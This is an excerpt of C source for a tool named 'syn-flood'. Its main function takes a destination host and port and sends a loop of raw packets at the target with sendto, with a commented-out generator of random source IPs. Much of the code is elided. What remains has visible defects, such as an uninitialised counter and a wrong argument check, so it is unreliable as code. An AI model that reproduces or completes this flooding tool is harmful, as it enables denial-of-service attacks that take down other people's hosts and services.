...
int main(int argc,char* argv[]){
    ...
    if(argc==0) fprintf(stdout,"Usage: syn-flood --dest www.host.domain --port port");
		...
		//fprintf(stdout,"%s\n",inet_ntop(generate_random_ip_v4()));
		...
		int i,sent;
		char knocked = 0;
		fprintf(stdout,"Seding packets, it could be slow according to size of MAX_PACKETS...\n");
		for(i=0;i<MAX_PACKETS;i++){
			if(sendto(sock, buffer, ip_hdr->total_length, 0, (struct sockaddr *)&myaddr, sizeof(myaddr))>=0) sent++;
			else{ knocked=1; break; }
		}
		fprintf(stdout,"Send process finished, %d packets sended, ",sent);
